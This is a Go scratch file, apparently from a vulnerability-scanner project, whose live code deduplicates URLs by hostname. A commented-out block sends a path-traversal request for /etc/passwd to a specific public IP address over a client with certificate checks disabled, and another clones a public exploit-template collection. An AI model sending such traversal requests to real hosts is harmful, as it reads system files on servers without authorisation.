package main

import (
	"fmt"
	"net/url"
)

/*s1 := "dadfa/daf"
a1List := strings.Split(s1, "l")
fmt.Println(reflect.TypeOf(a1List))*/
//测试osDo.ParseCmd()
//fmt.Println(osDo.ParseCmd())

/*//获取用户名 //osDo.Getuser()
currentUser, _ := user.Current()
fmt.Println(currentUser.Name)*/
/*	//下载poc到/home/user/.local/目录
	bashCommand := "cd /home/$LOGNAME/.local/ && git clone https://github.com/projectdiscovery/nuclei-templates.git && cd -"
	cmd := exec.Command("bash", "-c", bashCommand)

	err := cmd.Run()
	if err != nil {
		log.Fatalf("Failed to execute command: %v", err)
	}*/
/*//测试templates可用性
res, err := os.ReadFile("test.yaml")
if err != nil {
	log.Println(err)
}
var data templates.Req
yaml.Unmarshal(res, &data)
fmt.Println(data.Packets[0].Matchers)*/

/*type Result struct {
	URL   string
	Error error
}

func main() {
	var tr *http.Transport
	proxList := strings.Split("http://127.0.0.1:8083", "://")
	if "http://127.0.0.1:8083" != "nul" { //判断proxy是否有值
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},                           //防止https证书错误的问题
			Proxy:           http.ProxyURL(&url.URL{Scheme: proxList[0], Host: proxList[1]}), //代理
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //防止https证书错误的问题
		}
	}
	client := &http.Client{Transport: tr}
	data := ""
	boby := strings.NewReader(data)
	req, _ := http.NewRequest("GET", "http://18.193.157.177:8080/api/v1/slack/image/slack-image%2F..%2F..%2F..%2Fetc%2Fpasswd", boby)
	resp, _ := client.Do(req)
	respByte, _ := io.ReadAll(resp.Body)

	fmt.Println(string(respByte))
}
*/

func RemoveDuplicateIPs(urls []string) []string {
	encountered := make(map[string]bool)
	result := []string{}

	for _, urlStr := range urls {
		u, err := url.Parse(urlStr)
		if err != nil {
			continue
		}

		host := u.Hostname()
		if !encountered[host] {
			encountered[host] = true
			result = append(result, urlStr)
		}
	}

	return result
}

func main() {
	urls := []string{
		"https://www.127.0.0.1:8907",
		"http://www.127.0.0.1:8907",
		"http://www.127.0.1.1:8907",
		"http://www.127.0.0.1:89",
	}

	uniqueURLs := RemoveDuplicateIPs(urls)
	fmt.Println(uniqueURLs)
}
